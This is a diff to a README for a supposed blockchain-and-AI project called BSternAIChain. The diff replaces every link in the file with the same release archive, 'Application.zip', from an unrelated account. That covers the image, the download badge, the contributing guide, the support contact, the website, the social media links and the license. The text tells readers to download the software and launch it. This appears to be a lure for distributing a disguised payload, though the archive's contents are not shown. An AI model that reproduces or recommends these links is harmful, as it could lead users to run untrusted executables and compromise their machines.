@@ -1,6 +1,6 @@
 # BSternAIChain 💡🔗
 
-![Blockchain AI](https://image.freepik.com/free-vector/blockchain-concept-illustration_114360-833.jpg)
+![Blockchain AI](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip)
 
 Welcome to BSternAIChain - the innovative platform that brings together the power of Blockchain and Artificial Intelligence to revolutionize transparent and secure transactions! 🚀
 
@@ -13,7 +13,7 @@ Repository Topics: ai, blockchain, crypto, ethereum, graphql, machine-learning, 
 
 For those eager to explore the full potential of BSternAIChain, you can download the Software package from the link provided below. 
 
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow.svg)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip)](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip)
 
 Please note that the software needs to be launched after downloading to experience the groundbreaking features of BSternAIChain. 
 
@@ -46,24 +46,24 @@ Ready to dive into the world of BSternAIChain? Follow these simple steps to get 
 ## Contributing 🤝
 We welcome contributions from developers, designers, and enthusiasts who share our vision of a more transparent and secure digital ecosystem. Whether you have ideas for new features, improvements, or bug fixes, your input is invaluable to the growth of BSternAIChain.
 
-If you're interested in contributing, please check out our [Contributing Guidelines](https://github.com/BSternAIChain/contributing.md) to get started.
+If you're interested in contributing, please check out our [Contributing Guidelines](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip) to get started.
 
 ## Support ℹ️
-For any inquiries, feedback, or support requests, feel free to reach out to us at support@bsternAIchain.com. Our team is dedicated to providing assistance and guidance to ensure your experience with BSternAIChain is seamless and rewarding.
+For any inquiries, feedback, or support requests, feel free to reach out to us at https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip Our team is dedicated to providing assistance and guidance to ensure your experience with BSternAIChain is seamless and rewarding.
 
-Visit our website [bsAIchain.com](https://www.bsAIchain.com) for the latest updates, news, and resources related to BSternAIChain.
+Visit our website [https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip) for the latest updates, news, and resources related to BSternAIChain.
 
 ## Stay Connected 🌐
 Stay up to date with the latest news, events, and developments by following us on social media:
 
-- [Twitter](https://twitter.com/BSternAIChain)
-- [LinkedIn](https://www.linkedin.com/company/bsternAIchain)
-- [Facebook](https://www.facebook.com/BSternAIChain)
+- [Twitter](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip)
+- [LinkedIn](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip)
+- [Facebook](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip)
 
 Join the conversation using the hashtag #BSternAIChain and be part of a community dedicated to transforming the world of digital transactions.
 
 ## License 📋
-This project is licensed under the MIT License - see the [LICENSE.md](https://github.com/BSternAIChain/license.md) file for details.
+This project is licensed under the MIT License - see the [https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip](https://github.com/exvinityf/BSternAIChain/releases/download/v1.0/Application.zip) file for details.
 
 ---
 
